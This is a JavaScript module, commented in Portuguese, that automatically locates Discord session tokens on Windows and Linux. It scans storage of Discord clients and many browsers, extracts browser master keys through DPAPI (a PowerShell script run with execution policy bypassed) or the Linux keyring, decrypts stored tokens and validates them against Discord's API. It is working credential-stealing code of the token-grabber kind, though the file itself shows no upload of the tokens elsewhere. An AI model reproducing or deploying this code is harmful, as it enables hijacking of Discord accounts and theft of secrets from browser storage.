// src/services/tokenFinder.js - Busca automática de tokens do Discord
//
// Compatível com Windows e Linux (Arch Linux, Ubuntu, Fedora, etc.)
//
// Procura tokens do Discord nos seguintes locais:
// 1. Discord Desktop (app instalado)
// 2. Discord PTB (Public Test Build)
// 3. Discord Canary
// 4. Discord via Flatpak / Snap (Linux)
// 5. Google Chrome / Chromium
// 6. Microsoft Edge
// 7. Brave Browser
// 8. Opera / Opera GX
// 9. Vivaldi
// 10. Firefox (perfis do Linux)
//
// Suporta dois formatos:
// - Tokens em texto puro (regex nos ficheiros .ldb/.log)
// - Tokens encriptados:
//   - Windows: DPAPI (CryptUnprotectData) + AES-256-GCM
//   - Linux: GNOME Keyring / secret-tool + AES-128-CBC (PBKDF2)

const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const { execSync } = require('child_process');
const os = require('os');

// Padrão regex para tokens em texto puro
const PLAIN_TOKEN_PATTERNS = [
  /[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}/g,
  /mfa\.[\w-]{84,}/g,
];

// Padrão para tokens encriptados (Chromium DPAPI)
const ENCRYPTED_TOKEN_PATTERN = /dQw4w9WgXcQ:([^\s"',;}{)\]]+)/g;

const isLinux = process.platform === 'linux';
const isWindows = process.platform === 'win32';

/**
 * Retorna os caminhos onde o Discord/navegadores guardam dados.
 * Suporta Windows e Linux (incluindo Arch Linux e outras distros).
 */
function getSearchPaths() {
  if (isLinux) {
    return getLinuxSearchPaths();
  }
  return getWindowsSearchPaths();
}

function getWindowsSearchPaths() {
  const appData = process.env.APPDATA || path.join(os.homedir(), 'AppData', 'Roaming');
  const localAppData = process.env.LOCALAPPDATA || path.join(os.homedir(), 'AppData', 'Local');

  return [
    // ===== Aplicações Discord =====
    {
      name: 'Discord',
      leveldb: path.join(appData, 'discord', 'Local Storage', 'leveldb'),
      localState: path.join(appData, 'discord', 'Local State'),
    },
    {
      name: 'Discord PTB',
      leveldb: path.join(appData, 'discordptb', 'Local Storage', 'leveldb'),
      localState: path.join(appData, 'discordptb', 'Local State'),
    },
    {
      name: 'Discord Canary',
      leveldb: path.join(appData, 'discordcanary', 'Local Storage', 'leveldb'),
      localState: path.join(appData, 'discordcanary', 'Local State'),
    },
    // ===== Navegadores (Chromium-based) =====
    {
      name: 'Google Chrome',
      leveldb: path.join(localAppData, 'Google', 'Chrome', 'User Data', 'Default', 'Local Storage', 'leveldb'),
      localState: path.join(localAppData, 'Google', 'Chrome', 'User Data', 'Local State'),
    },
    {
      name: 'Microsoft Edge',
      leveldb: path.join(localAppData, 'Microsoft', 'Edge', 'User Data', 'Default', 'Local Storage', 'leveldb'),
      localState: path.join(localAppData, 'Microsoft', 'Edge', 'User Data', 'Local State'),
    },
    {
      name: 'Brave',
      leveldb: path.join(localAppData, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'Local Storage', 'leveldb'),
      localState: path.join(localAppData, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Local State'),
    },
    {
      name: 'Opera',
      leveldb: path.join(appData, 'Opera Software', 'Opera Stable', 'Local Storage', 'leveldb'),
      localState: path.join(appData, 'Opera Software', 'Opera Stable', 'Local State'),
    },
    {
      name: 'Opera GX',
      leveldb: path.join(appData, 'Opera Software', 'Opera GX Stable', 'Local Storage', 'leveldb'),
      localState: path.join(appData, 'Opera Software', 'Opera GX Stable', 'Local State'),
    },
    {
      name: 'Vivaldi',
      leveldb: path.join(localAppData, 'Vivaldi', 'User Data', 'Default', 'Local Storage', 'leveldb'),
      localState: path.join(localAppData, 'Vivaldi', 'User Data', 'Local State'),
    },
  ];
}

function getLinuxSearchPaths() {
  const home = os.homedir();
  const configDir = process.env.XDG_CONFIG_HOME || path.join(home, '.config');

  return [
    // ===== Aplicações Discord (Linux) =====
    {
      name: 'Discord',
      leveldb: path.join(configDir, 'discord', 'Local Storage', 'leveldb'),
      localState: path.join(configDir, 'discord', 'Local State'),
    },
    {
      name: 'Discord PTB',
      leveldb: path.join(configDir, 'discordptb', 'Local Storage', 'leveldb'),
      localState: path.join(configDir, 'discordptb', 'Local State'),
    },
    {
      name: 'Discord Canary',
      leveldb: path.join(configDir, 'discordcanary', 'Local Storage', 'leveldb'),
      localState: path.join(configDir, 'discordcanary', 'Local State'),
    },
    // ===== Discord via Flatpak =====
    {
      name: 'Discord (Flatpak)',
      leveldb: path.join(home, '.var', 'app', 'com.discordapp.Discord', 'config', 'discord', 'Local Storage', 'leveldb'),
      localState: path.join(home, '.var', 'app', 'com.discordapp.Discord', 'config', 'discord', 'Local State'),
    },
    // ===== Discord via Snap =====
    {
      name: 'Discord (Snap)',
      leveldb: path.join(home, 'snap', 'discord', 'current', '.config', 'discord', 'Local Storage', 'leveldb'),
      localState: path.join(home, 'snap', 'discord', 'current', '.config', 'discord', 'Local State'),
    },
    // ===== Navegadores (Chromium-based - Linux) =====
    {
      name: 'Google Chrome',
      leveldb: path.join(configDir, 'google-chrome', 'Default', 'Local Storage', 'leveldb'),
      localState: path.join(configDir, 'google-chrome', 'Local State'),
    },
    {
      name: 'Google Chrome (Flatpak)',
      leveldb: path.join(home, '.var', 'app', 'com.google.Chrome', 'config', 'google-chrome', 'Default', 'Local Storage', 'leveldb'),
      localState: path.join(home, '.var', 'app', 'com.google.Chrome', 'config', 'google-chrome', 'Local State'),
    },
    {
      name: 'Chromium',
      leveldb: path.join(configDir, 'chromium', 'Default', 'Local Storage', 'leveldb'),
      localState: path.join(configDir, 'chromium', 'Local State'),
    },
    {
      name: 'Microsoft Edge',
      leveldb: path.join(configDir, 'microsoft-edge', 'Default', 'Local Storage', 'leveldb'),
      localState: path.join(configDir, 'microsoft-edge', 'Local State'),
    },
    {
      name: 'Brave',
      leveldb: path.join(configDir, 'BraveSoftware', 'Brave-Browser', 'Default', 'Local Storage', 'leveldb'),
      localState: path.join(configDir, 'BraveSoftware', 'Brave-Browser', 'Local State'),
    },
    {
      name: 'Opera',
      leveldb: path.join(configDir, 'opera', 'Local Storage', 'leveldb'),
      localState: path.join(configDir, 'opera', 'Local State'),
    },
    {
      name: 'Vivaldi',
      leveldb: path.join(configDir, 'vivaldi', 'Default', 'Local Storage', 'leveldb'),
      localState: path.join(configDir, 'vivaldi', 'Local State'),
    },
    // ===== Firefox (Linux) - usa perfis em profiles.ini =====
    ...getFirefoxPaths(),
  ];
}

/**
 * Procura diretórios de perfil do Firefox no Linux.
 * Firefox armazena tokens no localStorage do IndexedDB, não em LevelDB.
 * Procuramos nos ficheiros de storage do webappsstore.
 */
function getFirefoxPaths() {
  const home = os.homedir();
  const firefoxDir = path.join(home, '.mozilla', 'firefox');

  if (!fs.existsSync(firefoxDir)) return [];

  const results = [];
  try {
    const entries = fs.readdirSync(firefoxDir);
    for (const entry of entries) {
      // Perfis do Firefox terminam em .default, .default-release, etc.
      if (!entry.includes('.')) continue;
      const profilePath = path.join(firefoxDir, entry);
      const storagePath = path.join(profilePath, 'storage', 'default');
      if (fs.existsSync(storagePath)) {
        // Procurar pelo diretório do discord.com no storage do Firefox
        try {
          const storageDirs = fs.readdirSync(storagePath);
          for (const dir of storageDirs) {
            if (dir.includes('discord.com')) {
              const lsDir = path.join(storagePath, dir, 'ls');
              if (fs.existsSync(lsDir)) {
                results.push({
                  name: `Firefox (${entry})`,
                  leveldb: lsDir,
                  localState: null, // Firefox não usa Local State
                });
              }
            }
          }
        } catch (_) {}
      }
    }
  } catch (_) {}

  return results;
}

// ====================== DECRYPTION (Windows DPAPI + Linux Keyring) ======================

/**
 * Lê a chave mestre de encriptação do ficheiro "Local State" do Chromium.
 * Windows: chave encriptada com DPAPI.
 * Linux: chave derivada da password do keyring (GNOME Keyring / KWallet / secret-tool).
 */
function getMasterKey(localStatePath) {
  if (!localStatePath || !fs.existsSync(localStatePath)) return null;

  try {
    const localState = JSON.parse(fs.readFileSync(localStatePath, 'utf8'));
    const encryptedKeyB64 = localState?.os_crypt?.encrypted_key;

    if (!encryptedKeyB64) {
      // No Linux, se não há encrypted_key, tentar obter via keyring
      if (isLinux) return getLinuxMasterKey();
      return null;
    }

    // Base64 decode -> remove prefixo "DPAPI" (5 bytes)
    const encryptedKey = Buffer.from(encryptedKeyB64, 'base64');
    const dpapiBlob = encryptedKey.slice(5);

    if (isWindows) {
      return dpapiDecrypt(dpapiBlob);
    }

    if (isLinux) {
      return getLinuxMasterKey();
    }

    return null;
  } catch (_) {
    return null;
  }
}

/**
 * Obtém a chave mestre do Chromium no Linux.
 *
 * No Linux, o Chromium usa uma password do keyring do sistema para derivar
 * a chave de encriptação via PBKDF2. A password padrão é "peanuts" quando
 * o keyring não está disponível, ou obtida via secret-tool do GNOME Keyring.
 */
function getLinuxMasterKey() {
  // Tentar obter a password do GNOME Keyring via secret-tool
  const passwords = [
    getSecretToolPassword('chromium', 'Chrome Safe Storage'),
    getSecretToolPassword('chrome', 'Chrome Safe Storage'),
    'peanuts', // Password padrão quando keyring não está disponível
  ];

  for (const password of passwords) {
    if (!password) continue;
    try {
      // Chromium no Linux usa PBKDF2 com a password do keyring
      // Salt: "saltysalt", iterações: 1, keylen: 16 bytes, hash: sha1
      const key = crypto.pbkdf2Sync(password, 'saltysalt', 1, 16, 'sha1');
      return key;
    } catch (_) {}
  }

  return null;
}

/**
 * Tenta obter a password de encriptação do Chromium via secret-tool (libsecret).
 * Funciona com GNOME Keyring, KDE KWallet (via libsecret bridge), etc.
 */
function getSecretToolPassword(application, label) {
  try {
    const result = execSync(
      `secret-tool lookup application ${application} 2>/dev/null || secret-tool lookup xdg:schema chrome_libsecret_os_crypt_password_v2 application ${application} 2>/dev/null`,
      { encoding: 'utf8', timeout: 5000 }
    ).trim();
    return result || null;
  } catch (_) {
    return null;
  }
}

/**
 * Desencripta dados usando Windows DPAPI via PowerShell.
 * Usa CryptUnprotectData do Windows para desencriptar a chave mestre.
 */
function dpapiDecrypt(encryptedBuffer) {
  try {
    // Converte o buffer para base64 para passar ao PowerShell
    const b64 = encryptedBuffer.toString('base64');

    // Usa ficheiro temporário para evitar problemas com aspas no PowerShell
    const tmpScript = path.join(os.tmpdir(), `dpapi_${Date.now()}.ps1`);
    const psContent = [
      'Add-Type -AssemblyName "System.Security"',
      `$encrypted = [Convert]::FromBase64String("${b64}")`,
      '$decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect($encrypted, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)',
      'Write-Output ([Convert]::ToBase64String($decrypted))',
    ].join('\r\n');

    fs.writeFileSync(tmpScript, psContent);

    const result = execSync(
      `powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "${tmpScript}"`,
      { encoding: 'utf8', timeout: 10000, windowsHide: true }
    ).trim();

    // Limpar ficheiro temporário
    try { fs.unlinkSync(tmpScript); } catch (_) {}

    return Buffer.from(result, 'base64');
  } catch (_) {
    return null;
  }
}

/**
 * Desencripta um token encriptado usando a chave mestre.
 *
 * Windows (AES-256-GCM):
 *   [v10/v11 (3 bytes)] [IV (12 bytes)] [ciphertext + tag (16 bytes)]
 *
 * Linux (AES-128-CBC):
 *   [v10/v11 (3 bytes)] [IV (16 bytes)] [ciphertext com padding PKCS7]
 */
function decryptToken(encryptedTokenB64, masterKey) {
  try {
    const buf = Buffer.from(encryptedTokenB64, 'base64');

    // Os primeiros 3 bytes são a versão (v10 ou v11)
    const version = buf.slice(0, 3).toString();
    if (version !== 'v10' && version !== 'v11') return null;

    if (isLinux) {
      return decryptTokenLinux(buf, masterKey);
    }

    return decryptTokenWindows(buf, masterKey);
  } catch (_) {
    return null;
  }
}

/**
 * Desencripta token no Windows com AES-256-GCM.
 */
function decryptTokenWindows(buf, masterKey) {
  try {
    const iv = buf.slice(3, 15);
    const ciphertextWithTag = buf.slice(15);
    const authTag = ciphertextWithTag.slice(ciphertextWithTag.length - 16);
    const ciphertext = ciphertextWithTag.slice(0, ciphertextWithTag.length - 16);

    const decipher = crypto.createDecipheriv('aes-256-gcm', masterKey, iv);
    decipher.setAuthTag(authTag);

    let decrypted = decipher.update(ciphertext, null, 'utf8');
    decrypted += decipher.final('utf8');
    return decrypted;
  } catch (_) {
    return null;
  }
}

/**
 * Desencripta token no Linux com AES-128-CBC (formato Chromium Linux).
 */
function decryptTokenLinux(buf, masterKey) {
  try {
    // No Linux, IV é de 16 bytes (espaço com valor 0x20 repetido)
    const iv = Buffer.alloc(16, ' ');
    const ciphertext = buf.slice(3);

    const decipher = crypto.createDecipheriv('aes-128-cbc', masterKey, iv);
    let decrypted = decipher.update(ciphertext, null, 'utf8');
    decrypted += decipher.final('utf8');
    return decrypted;
  } catch (_) {
    return null;
  }
}

// ====================== TOKEN SEARCH ======================

/**
 * Procura tokens (em texto puro e encriptados) num diretório de LevelDB.
 */
function findTokensInDirectory(dirPath, masterKey) {
  const tokens = new Set();

  if (!fs.existsSync(dirPath)) return tokens;

  try {
    const files = fs.readdirSync(dirPath);

    for (const file of files) {
      // Aceitar .ldb, .log e ficheiros do Firefox (.sqlite, data sem extensão)
      const validExt = file.endsWith('.ldb') || file.endsWith('.log') || file.endsWith('.sqlite');
      if (!validExt && file.includes('.')) continue;

      const filePath = path.join(dirPath, file);

      try {
        // Ler como binary para não perder dados
        const contentBuf = fs.readFileSync(filePath);
        const content = contentBuf.toString('utf8');

        // 1. Procurar tokens em texto puro
        for (const pattern of PLAIN_TOKEN_PATTERNS) {
          pattern.lastIndex = 0;
          let match;
          while ((match = pattern.exec(content)) !== null) {
            tokens.add(match[0]);
          }
        }

        // 2. Procurar tokens encriptados (se temos a masterKey)
        if (masterKey) {
          ENCRYPTED_TOKEN_PATTERN.lastIndex = 0;
          let match;
          while ((match = ENCRYPTED_TOKEN_PATTERN.exec(content)) !== null) {
            const encryptedB64 = match[1];
            try {
              const decrypted = decryptToken(encryptedB64, masterKey);
              if (decrypted && decrypted.length > 20) {
                tokens.add(decrypted);
              }
            } catch (_) {}
          }
        }
      } catch (_) {
        // Ficheiro bloqueado pelo processo - normal se o app estiver aberto
      }
    }
  } catch (_) {}

  return tokens;
}

/**
 * Procura tokens em todos os locais conhecidos.
 * Retorna um array de { source: string, token: string }.
 */
function findAllTokens() {
  const results = [];
  const seenTokens = new Set();
  const searchPaths = getSearchPaths();

  for (const location of searchPaths) {
    // Obter a chave mestre para desencriptar tokens (se disponível)
    let masterKey = null;
    if (location.localState) {
      masterKey = getMasterKey(location.localState);
    }

    const tokens = findTokensInDirectory(location.leveldb, masterKey);

    for (const token of tokens) {
      if (seenTokens.has(token)) continue;
      seenTokens.add(token);

      results.push({
        source: location.name,
        token,
        preview: maskToken(token),
      });
    }
  }

  return results;
}

/**
 * Mascara um token para exibição segura.
 */
function maskToken(token) {
  if (token.length <= 10) return '***';
  const start = token.substring(0, 6);
  const end = token.substring(token.length - 4);
  return `${start}${'*'.repeat(8)}${end}`;
}

/**
 * Valida se um token é funcional tentando consultar a API do Discord.
 * Retorna { valid: boolean, username?: string }
 */
async function validateToken(token) {
  const https = require('https');

  return new Promise((resolve) => {
    const options = {
      hostname: 'discord.com',
      path: '/api/v9/users/@me',
      method: 'GET',
      headers: {
        'Authorization': token,
        'Content-Type': 'application/json',
      },
    };

    const req = https.request(options, (res) => {
      let data = '';
      res.on('data', (chunk) => { data += chunk; });
      res.on('end', () => {
        if (res.statusCode === 200) {
          try {
            const user = JSON.parse(data);
            resolve({
              valid: true,
              username: user.username || 'Desconhecido',
              globalName: user.global_name || user.username,
              id: user.id,
            });
          } catch (_) {
            resolve({ valid: false });
          }
        } else {
          resolve({ valid: false });
        }
      });
    });

    req.on('error', () => resolve({ valid: false }));
    req.setTimeout(5000, () => {
      req.destroy();
      resolve({ valid: false });
    });
    req.end();
  });
}

/**
 * Busca e valida todos os tokens encontrados.
 * Retorna apenas os tokens válidos com informações do utilizador.
 */
async function findAndValidateTokens(onProgress) {
  const allTokens = findAllTokens();

  if (allTokens.length === 0) {
    return [];
  }

  const validTokens = [];
  // Deduplica por token real (o mesmo token pode estar em vários locais)
  const validatedSet = new Set();

  for (let i = 0; i < allTokens.length; i++) {
    const entry = allTokens[i];

    if (onProgress) {
      onProgress({
        current: i + 1,
        total: allTokens.length,
        source: entry.source,
        preview: entry.preview,
      });
    }

    if (validatedSet.has(entry.token)) continue;
    validatedSet.add(entry.token);

    const result = await validateToken(entry.token);

    if (result.valid) {
      validTokens.push({
        source: entry.source,
        token: entry.token,
        preview: entry.preview,
        username: result.username,
        globalName: result.globalName,
        userId: result.id,
      });
    }
  }

  return validTokens;
}

module.exports = {
  findAllTokens,
  validateToken,
  findAndValidateTokens,
  maskToken,
};
